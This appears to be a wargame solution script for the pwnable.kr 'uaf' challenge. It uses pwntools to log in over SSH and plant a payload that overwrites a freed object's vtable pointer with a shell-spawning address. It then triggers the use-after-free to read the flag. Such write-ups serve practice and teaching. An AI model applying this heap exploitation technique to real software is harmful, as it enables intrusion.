from pwn import *

# uaf
host = 'pwnable.kr'
user = 'uaf'
password = 'guest'
port = 2222

# Notes
#   * The trickiest part of this challenge is figuring out how many bytes to
#     read from your file. It turns out you want to read 0x18 = 24 bytes so
#     that malloc gives you the two `Human` objects that were just freed

def attack():
  s = ssh(host=host, user=user, password=password, port=port)

  shell_addr = 0x401588
  exploit = p32(shell_addr) + 20 * '\x00'
  s.system("python -c \"print {}\" > /tmp/fortenforge".format(repr(exploit)))

  args = ['./uaf', '24', '/tmp/fortenforge']
  p = s.process(args)
  print p.recv().strip()

  p.sendline('3')
  p.sendline('2')
  p.sendline('2')
  p.sendline('1')
  p.recvuntil('$')
  p.sendline('cat flag')
  print p.recvline()

if __name__ == '__main__':
  attack()
